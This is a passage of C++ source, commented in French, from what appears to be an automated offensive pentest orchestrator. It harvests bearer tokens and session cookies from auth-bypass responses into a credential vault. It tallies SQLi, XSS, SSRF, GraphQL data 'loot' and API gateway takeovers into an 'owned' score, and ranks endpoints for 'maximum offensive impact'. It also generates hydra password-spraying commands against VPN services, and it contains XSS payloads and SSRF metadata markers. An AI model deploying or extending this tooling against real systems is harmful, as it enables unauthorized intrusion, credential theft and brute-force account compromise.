        R"((eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}))");
    static const std::regex re_cookie(
        R"((Set-Cookie:\s*([A-Za-z0-9_\-]+)=([^;]+)))",
        std::regex::icase);

    nlohmann::json vault = load_creds_vault(workdir);
    bool changed = false;

    {
        auto it  = std::sregex_iterator(blob.begin(), blob.end(), re_jwt);
        auto end = std::sregex_iterator();
        for (; it != end; ++it) {
            std::string tok  = it->str();
            std::string host = extract_hostname(endpoint);
            vault_add_credential(
                vault, host, "api", endpoint,
                "__token__bearer", tok, "api_auth_bypass");
            changed = true;
        }
    }
    {
        auto it  = std::sregex_iterator(blob.begin(), blob.end(), re_cookie);
        auto end = std::sregex_iterator();
        for (; it != end; ++it) {
            std::string name = (*it)[1].str();
            std::string val  = (*it)[2].str();
            std::string host = extract_hostname(endpoint);
            vault_add_credential(
                vault, host, "api", endpoint,
                "__cookie__" + name, val, "api_auth_bypass");
            changed = true;
        }
    }

    if (changed) {
        try {
            save_creds_vault(workdir, vault);
        } catch (...) {}
    }
}

// Petite "IA symbolique" locale pour prioriser les endpoints en JSON (sans MCP externe)
struct ApiPriorEntry {
    std::string url;
    int         score;
    std::string reason;
};

static int api_score_url(const std::string& url, std::string& why_out) {
    std::string low = to_lower_copy(url);
    int score = 0;
    std::vector<std::string> reasons;

    auto bump = [&](int s, const char* r) {
        score += s;
        reasons.emplace_back(r);
    };

    if (low.find("admin") != std::string::npos)
        bump(30, "admin");
    if (low.find("auth")   != std::string::npos ||
        low.find("login")  != std::string::npos ||
        low.find("signin") != std::string::npos)
        bump(25, "auth/login");
    if (low.find("user")    != std::string::npos ||
        low.find("account") != std::string::npos ||
        low.find("profile") != std::string::npos)
        bump(20, "user/account");
    if (low.find("billing") != std::string::npos ||
        low.find("payment") != std::string::npos ||
        low.find("invoice") != std::string::npos)
        bump(25, "billing/payment");
    if (low.find("graphql") != std::string::npos)
        bump(10, "graphql");
    if (low.find("debug") != std::string::npos ||
        low.find("test")  != std::string::npos ||
        low.find("dev")   != std::string::npos)
        bump(8, "debug/test");
    if (low.find("internal") != std::string::npos ||
        low.find("private")  != std::string::npos)
        bump(12, "internal/private");
    if (low.find("export")   != std::string::npos ||
        low.find("report")   != std::string::npos ||
        low.find("download") != std::string::npos ||
        low.find("dump")     != std::string::npos)
        bump(10, "data-export");

    if (low.find("/v1/") != std::string::npos ||
        low.find("/v2/") != std::string::npos ||
        low.find("/v3/") != std::string::npos)
        bump(3, "versioned");

    // profondeur du path
    std::size_t start_path = 0;
    auto pos_scheme = url.find("://");
    if (pos_scheme != std::string::npos) {
        auto p = url.find('/', pos_scheme + 3);
        if (p != std::string::npos)
            start_path = p;
        else
            start_path = url.size();
    }

    int depth = 0;
    for (std::size_t i = start_path; i < url.size(); ++i) {
        if (url[i] == '/') ++depth;
    }
    if (depth > 0) {
        score += depth * 2;
        if (depth >= 3) reasons.emplace_back("deep-path");
    }

    std::ostringstream oss;
    for (std::size_t i = 0; i < reasons.size(); ++i) {
        if (i) oss << ", ";
        oss << reasons[i];
    }
    why_out = oss.str();
    return score;
}

// Overload local de call_mcp_analyze pour prioriser un JSON API (sans lancer MCP externe)
static bool call_mcp_analyze(const std::string& input_json,
                             const std::string& prompt,
                             const std::string& out_json_path,
                             std::string& mcp_out)
{
    (void)prompt;  // non utilisé ici, mais gardé pour compatibilité API
    (void)mcp_out;

    nlohmann::json cat = nlohmann::json::parse(input_json, nullptr, false);
    if (cat.is_discarded()) return false;

    nlohmann::json out;
    out["generated_at"] = current_datetime_string();
    out["prompt"]       = prompt;
    out["urls"]         = nlohmann::json::array();

    std::set<std::string> urls;

    auto collect = [&](const nlohmann::json& arr) {
        if (!arr.is_array()) return;
        for (auto& v : arr) {
            if (v.is_string()) urls.insert(v.get<std::string>());
        }
    };

    if (cat.contains("rest") &&
        cat["rest"].is_object() &&
        cat["rest"].contains("endpoints")) {
        collect(cat["rest"]["endpoints"]);
    }
    if (cat.contains("graphql") &&
        cat["graphql"].is_object() &&
        cat["graphql"].contains("endpoints")) {
        collect(cat["graphql"]["endpoints"]);
    }

    std::vector<ApiPriorEntry> vec;
    vec.reserve(urls.size());

    for (auto& u : urls) {
        std::string why;
        int s = api_score_url(u, why);
        vec.push_back({u, s, why});
    }

    std::sort(vec.begin(), vec.end(),
              [](const ApiPriorEntry& a, const ApiPriorEntry& b) {
                  return a.score > b.score;
              });

    for (auto& e : vec) {
        out["urls"].push_back({
            {"url",    e.url},
            {"score",  e.score},
            {"reason", e.reason}
        });
    }

    try {
        std::ofstream f(out_json_path);
        f << out.dump(2);
    } catch (...) {
        return false;
    }

    return true;
}

static void analyse_postexploit_results_api(const std::string& baseurl,
                                            const fs::path& workdir)
{
    using nlohmann::json;
    namespace fs = std::filesystem;

    // --------------------------------------------------------------------
    // 1) api_catalog.json
    // --------------------------------------------------------------------
    json catalog;
    api_catalog_from_enum_files(workdir, catalog);
    try {
        std::ofstream(workdir / "api_catalog.json")
            << catalog.dump(2);
    } catch (...) {}

    // --------------------------------------------------------------------
    // 2) api_auth_findings.json (+ ingestion tokens)
    // --------------------------------------------------------------------
    json auth_findings = json::object();
    auth_findings["baseurl"]      = baseurl;
    auth_findings["generated_at"] = current_datetime_string();
    auth_findings["findings"]     = json::array();

    auto is_sensitive_path = [](const std::string& p) {
        std::string l = to_lower_copy(p);
        return l.find("/admin")   != std::string::npos ||
               l.find("/manage")  != std::string::npos ||
               l.find("/config")  != std::string::npos ||
               l.find("/settings")!= std::string::npos ||
               l.find("/internal")!= std::string::npos ||
               l.find("/private") != std::string::npos ||
               l.find("/user/")   != std::string::npos ||
               l.find("/account") != std::string::npos;
    };

    for (auto& f : glob_files(workdir, "api_auth_bypass_")) {
        std::string txt      = slurp_if_exists(f);
        if (txt.empty()) continue;

        std::string low      = to_lower_copy(txt);
        std::string endpoint = extract_url_from_line(txt);
        if (endpoint.empty()) endpoint = baseurl;

        bool ok =
            (low.find("http/1.1 200") != std::string::npos) ||
            (low.find("http/2 200")   != std::string::npos) ||
            (low.find(" 200 OK")      != std::string::npos) ||
            (low.find("set-cookie:")  != std::string::npos) ||
            (low.find("token")        != std::string::npos);

        bool critical = ok && is_sensitive_path(endpoint);

        json entry = json::object();
        entry["file"]      = f.filename().string();
        entry["endpoint"]  = endpoint;
        entry["success"]   = ok;
        entry["critical"]  = critical;
        entry["snippet"]   = txt.substr(0, 300);

        auth_findings["findings"].push_back(entry);

        if (ok) {
            api_ingest_tokens_to_vault(workdir, endpoint, txt);
        }
    }

    try {
        std::ofstream(workdir / "api_auth_findings.json")
            << auth_findings.dump(2);
    } catch (...) {}

    // --------------------------------------------------------------------
    // 3) graphql_loot.json – introspection + enum + abus (login/idor)
    // --------------------------------------------------------------------
    json gql_loot = json::object();
    gql_loot["baseurl"]      = baseurl;
    gql_loot["generated_at"] = current_datetime_string();
    gql_loot["entries"]      = json::array();

    auto parse_graphql_json = [&](const fs::path& p) -> json {
        std::string txt = slurp_if_exists(p);
        if (txt.empty()) return json();
        auto lb = txt.find('{');
        auto rb = txt.rfind('}');
        if (lb == std::string::npos || rb == std::string::npos || rb <= lb)
            return json();
        json j = json::parse(txt.substr(lb, rb - lb + 1), nullptr, false);
        if (j.is_discarded()) return json();
        return j;
    };

    fs::path gql_dir = workdir / "api_graphql";
    if (fs::exists(gql_dir)) {
        for (auto& f : glob_files(gql_dir, "introspection_")) {
            json j = parse_graphql_json(f);
            if (j.is_null()) continue;
            json e;
            e["file"]   = f.filename().string();
            e["kind"]   = "introspection";
            e["sample"] = j;
            gql_loot["entries"].push_back(e);
        }
        for (auto& f : glob_files(gql_dir, "enum_queries_")) {
            json j = parse_graphql_json(f);
            if (j.is_null()) continue;
            json e;
            e["file"]   = f.filename().string();
            e["kind"]   = "enum_queries";
            e["sample"] = j;
            gql_loot["entries"].push_back(e);
        }
        for (auto& f : glob_files(gql_dir, "abuse_login_")) {
            json j = parse_graphql_json(f);
            if (j.is_null()) continue;
            json e;
            e["file"]   = f.filename().string();
            e["kind"]   = "login_abuse";
            e["sample"] = j;
            gql_loot["entries"].push_back(e);
        }
        for (auto& f : glob_files(gql_dir, "abuse_idor_")) {
            json j = parse_graphql_json(f);
            if (j.is_null()) continue;
            json e;
            e["file"]   = f.filename().string();
            e["kind"]   = "idor_abuse";
            e["sample"] = j;
            gql_loot["entries"].push_back(e);
        }
    }

    for (auto& f : glob_files(workdir, "graphql_abuse_loot_")) {
        json j = parse_graphql_json(f);
        if (j.is_null()) continue;
        json e;
        e["file"]   = f.filename().string();
        e["kind"]   = "legacy_abuse";
        e["sample"] = j;
        gql_loot["entries"].push_back(e);
    }

    try {
        std::ofstream(workdir / "graphql_loot.json")
            << gql_loot.dump(2);
    } catch (...) {}

    // --------------------------------------------------------------------
    // 4) api_gateway_takeover.json – détection admin API GW
    // --------------------------------------------------------------------
    json gw = json::object();
    gw["baseurl"]         = baseurl;
    gw["generated_at"]    = current_datetime_string();
    gw["admin_responses"] = json::array();

    for (auto& f : glob_files(workdir, "api_gateway_kong_")) {
        std::string txt = slurp_if_exists(f);
        std::string low = to_lower_copy(txt);
        bool admin =
            (low.find("\"routes\"")   != std::string::npos) ||
            (low.find("\"services\"") != std::string::npos);

        gw["admin_responses"].push_back({
            {"file",        f.filename().string()},
            {"gateway",     "kong"},
            {"likely_open", admin}
        });
    }
    for (auto& f : glob_files(workdir, "api_gateway_tyk_")) {
        std::string txt = slurp_if_exists(f);
        std::string low = to_lower_copy(txt);
        bool admin =
            (low.find("\"apis\"") != std::string::npos) ||
            (low.find("\"keys\"") != std::string::npos);

        gw["admin_responses"].push_back({
            {"file",        f.filename().string()},
            {"gateway",     "tyk"},
            {"likely_open", admin}
        });
    }

    try {
        std::ofstream(workdir / "api_gateway_takeover.json")
            << gw.dump(2);
    } catch (...) {}

    // --------------------------------------------------------------------
    // 5) api_attack_findings.json – SQLi / XSS / SSRF / Bearer / GraphQL
    // --------------------------------------------------------------------
    json attacks = json::object();
    attacks["baseurl"]      = baseurl;
    attacks["generated_at"] = current_datetime_string();
    attacks["findings"]     = json::array();

    auto push_finding = [&](const json& f){
        attacks["findings"].push_back(f);
    };

    bool owned            = false;
    std::string own_level = "info";
    std::vector<std::string> own_reasons;

    auto score_of = [](const std::string& lvl)->int{
        if (lvl == "info")     return 0;
        if (lvl == "low")      return 1;
        if (lvl == "medium")   return 2;
        if (lvl == "high")     return 3;
        if (lvl == "critical") return 4;
        return 0;
    };
    auto bump_level = [&](const std::string& lvl){
        if (score_of(lvl) > score_of(own_level)) {
            own_level = lvl;
        }
    };

    bool has_admin_token                 = false;
    bool has_db_loot                     = false;
    bool has_confirmed_sqli              = false;
    bool has_confirmed_xss               = false;
    bool has_confirmed_ssrf              = false;
    bool has_graphql_loot_sensitive      = false;
    bool has_auth_bypass_critical_ep     = false;

    // --- 5.a SQLi (delta de longueur + dumps HTTP) -----------------------
    {
        fs::path enumdir = workdir / "api_enum";

        auto parse_ok_sqli = [](const std::string& line,
                                long& ok, long& sqli) -> bool {
            ok = 0; sqli = 0;
            std::smatch m1, m2;
            if (!std::regex_search(line, m1, std::regex("OK=([0-9]+)")))   return false;
            if (!std::regex_search(line, m2, std::regex("SQLI=([0-9]+)"))) return false;
            ok   = std::stol(m1[1].str());
            sqli = std::stol(m2[1].str());
            return true;
        };

        for (auto& p : glob_files(enumdir, "rest_sqli_summary")) {
            std::string line = slurp_if_exists(p);
            if (line.empty()) continue;
            long ok=0, sqli=0;
            if (!parse_ok_sqli(line, ok, sqli)) continue;
            long delta = sqli - ok;
            if (sqli > ok && delta > 0) {
                json f;
                f["type"]       = "sqli_length";
                f["endpoint"]   = "unknown";
                f["ok_count"]   = ok;
                f["sqli_count"] = sqli;
                f["delta"]      = delta;
                f["file"]       = p.filename().string();
                f["severity"]   = (delta >= 10 ? "high" : "medium");
                f["confirmed"]  = true;
                push_finding(f);

                has_confirmed_sqli = true;
                owned = true;
                bump_level(f["severity"].get<std::string>());
                own_reasons.push_back("SQLi détectée via delta de longueur");
            }
        }

        for (auto& p : glob_files(enumdir, "sqli_")) {
            std::string name = p.filename().string();
            if (name.find("_summary") == std::string::npos) continue;
            std::string line = slurp_if_exists(p);
            if (line.empty()) continue;
            long ok=0, sqli=0;
            if (!parse_ok_sqli(line, ok, sqli)) continue;
            long delta = sqli - ok;
            if (sqli > ok && delta > 0) {
                json f;
                f["type"]       = "sqli_length";
                f["endpoint"]   = "unknown";
                f["ok_count"]   = ok;
                f["sqli_count"] = sqli;
                f["delta"]      = delta;
                f["file"]       = name;
                f["severity"]   = (delta >= 10 ? "high" : "medium");
                f["confirmed"]  = true;
                push_finding(f);

                has_confirmed_sqli = true;
                owned = true;
                bump_level(f["severity"].get<std::string>());
                own_reasons.push_back("SQLi détectée via delta de longueur");
            }
        }

        // Loot SQLi – fichiers db_sqli_enum_* / db_sqli_dump_*
        for (auto& p : glob_files(enumdir, "db_sqli_")) {
            std::string body = slurp_if_exists(p);
            if (body.empty()) continue;
            std::string low = to_lower_copy(body);

            bool sensitive =
                (low.find("password") != std::string::npos) ||
                (low.find("passwd")   != std::string::npos) ||
                (low.find("hash")     != std::string::npos) ||
                (low.find("token")    != std::string::npos) ||
                (low.find("jwt")      != std::string::npos) ||
                (low.find("session")  != std::string::npos) ||
                (low.find("apikey")   != std::string::npos) ||
                (low.find("api_key")  != std::string::npos) ||
                (low.find("secret")   != std::string::npos) ||
                (low.find("email")    != std::string::npos);

            if (!sensitive) continue;

            json f;
            f["type"]      = "sqli_db_loot";
            f["file"]      = p.filename().string();
            f["severity"]  = "high";
            f["confirmed"] = true;
            push_finding(f);

            has_db_loot = true;
            owned       = true;
            bump_level("high");
            own_reasons.push_back("Loot DB sensible via SQLi HTTP");
        }
    }

    // --- 5.b XSS – markers XSS_DARKMOON & payloads ----------------------
    {
        const std::vector<std::string> markers = {
            "XSS_DARKMOON_",
            "<img src=x onerror=alert(1)>",
            "<script>alert(1)</script>",
            "javascript:alert(1)"
        };

        for (auto& p : glob_files(workdir, "rest_xss_")) {
            std::string body = slurp_if_exists(p);
            if (body.empty()) continue;
            bool hit = false;
            for (const auto& m : markers) {
                if (body.find(m) != std::string::npos) {
                    hit = true; break;
                }
            }
            if (!hit) continue;

            json f;
            f["type"]      = "xss";
            f["file"]      = p.filename().string();
            f["endpoint"]  = extract_url_from_line(body);
            f["severity"]  = "high";
            f["confirmed"] = true;
            push_finding(f);

            has_confirmed_xss = true;
            owned = true;
            bump_level("high");
            own_reasons.push_back("XSS reflétée / stockée détectée");
        }
    }

    // --- 5.c SSRF – rest_ssrf_* (200 + contenu interne) ------------------
    {
        for (auto& p : glob_files(workdir, "rest_ssrf_")) {
            std::string body = slurp_if_exists(p);
            if (body.empty()) continue;
            std::string low = to_lower_copy(body);

            bool status_ok =
                (low.find("http/1.1 200") != std::string::npos) ||
                (low.find("http/2 200")   != std::string::npos);

            bool internal =
                (low.find("169.254.169.254") != std::string::npos) ||
                (low.find("metadata")        != std::string::npos) ||
                (low.find("instance-id")     != std::string::npos) ||
                (low.find("/etc/passwd")     != std::string::npos) ||
                (low.find("root:x:")         != std::string::npos) ||
                (low.find("db_version")      != std::string::npos) ||
                (low.find("authorization:")  != std::string::npos);

            if (!status_ok) continue;

            json f;
            f["type"]      = internal ? "ssrf_internal" : "ssrf_candidate";
            f["file"]      = p.filename().string();
            f["endpoint"]  = extract_url_from_line(body);
            f["severity"]  = internal ? "critical" : "medium";
            f["confirmed"] = true;
            push_finding(f);

            has_confirmed_ssrf = true;
            bump_level(f["severity"].get<std::string>());
            if (internal) {
                owned = true;
                own_reasons.push_back("SSRF confirmée vers ressource interne");
            } else {
                own_reasons.push_back("SSRF potentielle détectée");
            }
        }
    }

    // --- 5.d Bearer tokens & endpoints admin avec Bearer -----------------
    {
        fs::path token = workdir / "bearer_token.txt";
        if (fs::exists(token)) {
            std::string tok = slurp_if_exists(token);
            if (!tok.empty()) {
                json f;
                f["type"]      = "bearer_token";
                f["file"]      = token.filename().string();
                f["preview"]   = (tok.size() > 60 ? tok.substr(0, 60) : tok);
                f["severity"]  = "high";
                f["confirmed"] = true;
                push_finding(f);

                has_admin_token = true;
                bump_level("high");
                own_reasons.push_back("Token Bearer obtenu via login/API");
            }
        }

        for (auto& p : glob_files(workdir, "rest_bearer_")) {
            std::string body = slurp_if_exists(p);
            if (body.empty()) continue;
            std::string low = to_lower_copy(body);

            bool ok =
                (low.find("http/1.1 200") != std::string::npos) ||
                (low.find("http/2 200")   != std::string::npos);

            if (!ok) continue;

            json f;
            f["type"]      = "admin_bearer_access";
            f["file"]      = p.filename().string();
            f["endpoint"]  = extract_url_from_line(body);
            f["severity"]  = "critical";
            f["confirmed"] = true;
            push_finding(f);

            has_admin_token = true;
            owned = true;
            bump_level("critical");
            own_reasons.push_back("Accès à un endpoint via Bearer token");
        }
    }

    // --- 5.e Loot GraphQL – champs sensibles dans gql_loot.entries -------
    {
        for (auto& e : gql_loot["entries"]) {
            if (!e.contains("sample")) continue;
            const json& s = e["sample"];
            std::string dump = s.dump();
            std::string low  = to_lower_copy(dump);

            bool sensitive =
                (low.find("password") != std::string::npos) ||
                (low.find("passwd")   != std::string::npos) ||
                (low.find("token")    != std::string::npos) ||
                (low.find("jwt")      != std::string::npos) ||
                (low.find("access_token") != std::string::npos) ||
                (low.find("idtoken")  != std::string::npos) ||
                (low.find("secret")   != std::string::npos) ||
                (low.find("apikey")   != std::string::npos) ||
                (low.find("api_key")  != std::string::npos) ||
                (low.find("email")    != std::string::npos && low.find("admin") != std::string::npos);

            if (!sensitive) continue;

            json f;
            f["type"]      = "graphql_loot";
            f["file"]      = e.value("file", "?");
            f["kind"]      = e.value("kind", "unknown");
            f["severity"]  = "high";
            f["confirmed"] = true;
            push_finding(f);

            has_graphql_loot_sensitive = true;
            owned = true;
            bump_level("high");
            own_reasons.push_back("Exfiltration de données sensibles via GraphQL");

            api_ingest_tokens_to_vault(workdir, "graphql", dump);
        }
    }

    // --- 5.f Auth bypass critiques (à partir d’api_auth_findings.json) ---
    for (const auto& e : auth_findings["findings"]) {
        if (!e.value("success", false)) continue;
        if (!e.value("critical", false)) continue;
        has_auth_bypass_critical_ep = true;
        owned = true;
        bump_level("critical");
        own_reasons.push_back("Auth bypass sur endpoint critique");
    }

    // --------------------------------------------------------------------
    // 6) target_score.json – vue globale & drapeau 'owned'
    // --------------------------------------------------------------------
    json score = json::object();
    score["baseurl"]      = baseurl;
    score["generated_at"] = current_datetime_string();
    score["owned"]        = owned;
    score["max_severity"] = own_level;
    score["reasons"]      = own_reasons;

    json flags = json::object();
    flags["has_admin_token"]             = has_admin_token;
    flags["has_db_loot"]                 = has_db_loot;
    flags["has_confirmed_sqli"]          = has_confirmed_sqli;
    flags["has_confirmed_xss"]           = has_confirmed_xss;
    flags["has_confirmed_ssrf"]          = has_confirmed_ssrf;
    flags["has_graphql_loot_sensitive"]  = has_graphql_loot_sensitive;
    flags["has_auth_bypass_critical_ep"] = has_auth_bypass_critical_ep;
    score["flags"] = flags;

    try {
        std::ofstream(workdir / "target_score.json")
            << score.dump(2);
    } catch (...) {}

    // --------------------------------------------------------------------
    // 7) Priorisation symbolique via MCP -> api_catalog_prioritized.json
    // --------------------------------------------------------------------
    try {
        std::string cat     = readFile((workdir / "api_catalog.json").string());
        std::string mcp_out = (workdir / "mcp_api_prioritize.out.txt").string();
        call_mcp_analyze(
            cat,
            "Priorise les endpoints et opérations d’API pour maximiser l’impact offensif. "
            "Renvoie un JSON structuré avec une clé 'urls' et une clé 'ops' ordonnées par priorité.",
            (workdir / "api_catalog_prioritized.json").string(),
            mcp_out
        );
    } catch (...) {
        // silencieux
    }
}

// ============================================================================
// [PATCH NET]  Orchestrateur Post-Exploit Réseau : VPN / SSH / RDP / PROXY
// ============================================================================
// Objectifs :
//  - Détecte services (ports + bannières) depuis recon_* (naabu, httpx, whatweb, etc.)
//  - Génère flows :
//      * FLOW_VPN_BRUTE (spray soft si outils dispo: hydra/ike-scan/wg, best-effort)
//      * FLOW_SSH_BRUTE / KEY_REUSE (ssh + clés découvertes / hydra si dispo)
//      * FLOW_RDP_ENUM / BRUTE (netexec rdp si dispo, sinon enum)
//      * FLOW_PROXY_OPEN_RELAY (CONNECT/SOCKS via curl pour tester pivot)
//  - Consolide en JSON :
//      * vpn_access.json
//      * ssh_owned_hosts.json
//      * rdp_owned_hosts.json
//      * open_proxy_loot.json
// ============================================================================

// --------- petits helpers locaux spécifiques NET (namespaces propres) ----------
static inline bool net_starts_with(const std::string& s, const std::string& p) {
    return s.rfind(p, 0) == 0;
}
static inline bool net_ends_with(const std::string& s, const std::string& suf) {
    return s.size()>=suf.size() && s.compare(s.size()-suf.size(), suf.size(), suf)==0;
}
static inline std::string net_to_lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c){ return (char)std::tolower(c); });
    return s;
}

// Lire un fichier si présent
static std::string net_slurp_if_exists(const fs::path& p) {
    if (!fs::exists(p)) return {};
    try { return readFile(p.string()); } catch(...) { return {}; }
}

// Détection rapide d'un binaire (POSIX) — best-effort (sur Windows, on laisse passer)
static std::string net_check_bin(const std::string& bin) {
#ifdef _WIN32
    (void)bin;
    return std::string(); // on ne bloque pas sous Windows
#else
    std::string out, err;
    bool ok = run_command_capture("command -v "+bin+" >/dev/null 2>&1 && echo OK || echo NO", out, err, 5000, false);
    if (!ok) return {};
    return (out.find("OK") != std::string::npos) ? bin : std::string();
#endif
}

// Ports intéressants
static const std::set<int> NET_PORTS_SSH     = {22};
static const std::set<int> NET_PORTS_RDP     = {3389};
static const std::set<int> NET_PORTS_VNC     = {5900, 5901, 5902};
static const std::set<int> NET_PORTS_TELNET  = {23};
static const std::set<int> NET_PORTS_WINRM   = {5985, 5986};
static const std::set<int> NET_PORTS_VPN_OVPN= {1194, 443};     // OpenVPN
static const std::set<int> NET_PORTS_VPN_WG  = {51820};
static const std::set<int> NET_PORTS_VPN_IPS = {500, 4500, 1701}; // IKE/L2TP-IPsec
static const std::set<int> NET_PORTS_VPN_PPTP= {1723};
static const std::set<int> NET_PORTS_HTTPPROXY = {3128, 8080, 8000, 8888, 8081};
static const std::set<int> NET_PORTS_SOCKS     = {1080};

// Harvest depuis naabu + bannières httpx/whatweb
static nlohmann::json harvest_net_triggers(const std::string& baseurl, const fs::path& workdir) {
    using json=nlohmann::json;

    std::set<int> ports_open;
    {
        fs::path naabu_all = find_newest_file_containing(workdir, "naabu");
        std::set<int> ports = parse_naabu_ports(naabu_all.empty()? workdir/"recon_naabu_all.txt" : naabu_all);
        ports_open.insert(ports.begin(), ports.end());
    }

    std::string banners = net_to_lower(net_slurp_if_exists(workdir/"recon_httpx.txt")
                                     + "\n" + net_slurp_if_exists(workdir/"recon_whatweb_verbose.log"));

    auto contains_any = [&](const std::string& hay, std::initializer_list<const char*> needles){
        for (auto* n : needles) if (hay.find(n)!=std::string::npos) return true;
        return false;
    };

    json j;
    j["host"] = extract_hostname(baseurl);
    j["ports_open"] = std::vector<int>(ports_open.begin(), ports_open.end());
    j["has_ssh"]    = (ports_open.count(22)>0) || (banners.find("ssh")!=std::string::npos);
    j["has_rdp"]    = (ports_open.count(3389)>0) || contains_any(banners, {"rdp","ms-wbt"});
    j["has_vnc"]    = (ports_open.count(5900)>0) || (ports_open.count(5901)>0) || (banners.find("vnc")!=std::string::npos);
    j["has_telnet"] = (ports_open.count(23)>0)   || (banners.find("telnet")!=std::string::npos);
    j["has_winrm"]  = (ports_open.count(5985)>0) || (ports_open.count(5986)>0) || (banners.find("winrm")!=std::string::npos);

    j["has_openvpn"]= (ports_open.count(1194)>0) || contains_any(banners, {"openvpn"});
    j["has_wireguard"]= (ports_open.count(51820)>0) || contains_any(banners, {"wireguard"});
    j["has_ipsec"]  = ports_open.count(500)>0 || ports_open.count(4500)>0 || ports_open.count(1701)>0 || contains_any(banners, {"ikev2","strongswan","charon","ipsec"});
    j["has_pptp"]   = (ports_open.count(1723)>0) || (banners.find("pptp")!=std::string::npos);

    // proxies
    bool any_http_proxy=false, any_socks=false;
    for (int p: ports_open) {
        if (NET_PORTS_HTTPPROXY.count(p)) any_http_proxy=true;
        if (NET_PORTS_SOCKS.count(p)) any_socks=true;
    }
    j["has_http_proxy"] = any_http_proxy || contains_any(banners, {"proxy","squid","tinyproxy"});
    j["has_socks"]      = any_socks      || contains_any(banners, {"socks5","socks4"});

    // ports listés par catégories (utile pour flows)
    auto filter_ports = [&](const std::set<int>& ref){
        std::vector<int> out;
        for (int p : ports_open) if (ref.count(p)) out.push_back(p);
        return out;
    };
    j["ports"] = {
        {"ssh",    filter_ports(NET_PORTS_SSH)},
        {"rdp",    filter_ports(NET_PORTS_RDP)},
        {"vnc",    filter_ports(NET_PORTS_VNC)},
        {"telnet", filter_ports(NET_PORTS_TELNET)},
        {"winrm",  filter_ports(NET_PORTS_WINRM)},
        {"openvpn",filter_ports(NET_PORTS_VPN_OVPN)},
        {"wireguard",filter_ports(NET_PORTS_VPN_WG)},
        {"ipsec",  filter_ports(NET_PORTS_VPN_IPS)},
        {"pptp",   filter_ports(NET_PORTS_VPN_PPTP)},
        {"httpproxy", filter_ports(NET_PORTS_HTTPPROXY)},
        {"socks",     filter_ports(NET_PORTS_SOCKS)}
    };

    return j;
}

// Ajout d'une commande au plan (compatible ConfirmationCommand minimal)
static void add_net_flow(std::vector<ConfirmationCommand>& plan,
                         nlohmann::json& plan_json,
                         const std::string& id,
                         const std::string& desc,
                         const std::string& cmd,
                         const fs::path& outfile,
                         const nlohmann::json& meta = {})
{
    ConfirmationCommand c;
    c.id          = id;
    c.description = desc;
    c.command     = cmd;
    c.outfile     = outfile;
    add_unique_cmd(plan, c);
    nlohmann::json m = meta;
    plan_json["flows"].push_back({
        {"id", id}, {"description", desc}, {"command", cmd},
        {"outfile", outfile.string()}, {"meta", m}
    });
}

// --------------------------- Flows : VPN BRUTE --------------------------------
static void append_vpn_brute_cmds(const std::string& baseurl,
                                  const fs::path& workdir,
                                  const nlohmann::json& trig,
                                  std::vector<ConfirmationCommand>& plan,
                                  nlohmann::json& plan_json)
{
    const std::string host = trig.value("host", extract_hostname(baseurl));
#ifndef _WIN32
    // On tente Hydra si dispo (module openvpn). Sinon on documente.
    const std::string have_hydra = net_check_bin("hydra");
    if (!have_hydra.empty()) {
        // Préparer de petites listes (spray soft) depuis vault + context
        nlohmann::json vault = load_creds_vault(workdir);
        auto users = build_contextual_usernames(host, vault);
        auto passw = build_contextual_passwords(host, /*surfaces*/ nlohmann::json::object(), workdir);
        uniq_prune(users, 30);
        uniq_prune(passw, 100);

        // Ecrire users.txt / pass.txt
        fs::path ufile = workdir/"vpn_users_spray.txt";
        fs::path pfile = workdir/"vpn_pass_spray.txt";
        { std::ofstream uf(ufile); for (auto& u: users) uf << u << "\n";
          std::ofstream pf(pfile); for (auto& p: passw) pf << p << "\n"; }

        // Pour chaque type VPN détecté, lancer un job hydra best-effort
        auto add_hydra = [&](const std::string& service, int port, const std::string& target){
            std::ostringstream cmd;
            cmd << "hydra -L \""<< ufile.string() <<"\" -P \""<< pfile.string()
                << "\" -t 4 -W 3 -s " << port
                << " " << service << "://" << target << " -o \"" << (workdir/("vpn_hydra_"+service+".txt")).string() << "\"";
            add_net_flow(plan, plan_json,
                        "FLOW_VPN_BRUTE_"+service,
                        "VPN spray soft via hydra sur "+service+" ("+target+":"+std::to_string(port)+")",
                        cmd.str(),
                        workdir/("FLOW_VPN_BRUTE_"+service+".txt"),
                        {{"service",service},{"host",host},{"port",port}});
        };

        for (int p : trig["ports"]["openvpn"])   add_hydra("openvpn", p, host);
        // IPsec/L2TP/PPTP/WG : hydra n'a pas tout — on logge une note pour analyste
        if (trig.value("has_ipsec",false))  add_net_flow(plan, plan_json, "FLOW_VPN_NOTE_IPSEC",
            "NOTE: IPsec détecté — utiliser ike-scan/strongswan pour tests ciblés si dispo.",
            "echo 'IPsec present on host' ; true", workdir/"vpn_ipsec_note.txt", {{"host",host}});
        if (trig.value("has_pptp",false))   add_net_flow(plan, plan_json, "FLOW_VPN_NOTE_PPTP",
            "NOTE: PPTP détecté — MS-CHAPv2 offline possible si capture.",
            "echo 'PPTP present on host' ; true", workdir/"vpn_pptp_note.txt", {{"host",host}});
        if (trig.value("has_wireguard",false)) add_net_flow(plan, plan_json, "FLOW_VPN_NOTE_WG",
            "NOTE: WireGuard détecté — pas de brute standard ; tenter handshakes d’énumération si outil dispo.",
            "echo 'WireGuard present on host' ; true", workdir/"vpn_wg_note.txt", {{"host",host}});
    } else
#endif
    {
        // Pas d'outil — on crée juste des notes
        if (trig.value("has_openvpn",false))
            add_net_flow(plan, plan_json, "FLOW_VPN_NOTE_OVPN",
                "OpenVPN détecté — hydra non disponible, spray non lancé.",
                "echo 'OpenVPN detected but hydra not found' ; true", workdir/"vpn_openvpn_note.txt", {{"host",host}});
        if (trig.value("has_ipsec",false))
            add_net_flow(plan, plan_json, "FLOW_VPN_NOTE_IPSEC",
                "IPsec détecté — outils spécifiques requis (ike-scan/strongswan).",
                "echo 'IPsec detected' ; true", workdir/"vpn_ipsec_note.txt", {{"host",host}});
        if (trig.value("has_pptp",false))
            add_net_flow(plan, plan_json, "FLOW_VPN_NOTE_PPTP",
                "PPTP détecté — MS-CHAPv2 offline possible si capture.",
                "echo 'PPTP detected' ; true", workdir/"vpn_pptp_note.txt", {{"host",host}});
        if (trig.value("has_wireguard",false))
            add_net_flow(plan, plan_json, "FLOW_VPN_NOTE_WG",
                "WireGuard détecté — brute non supportée en standard.",
                "echo 'WireGuard detected' ; true", workdir/"vpn_wg_note.txt", {{"host",host}});
    }
}

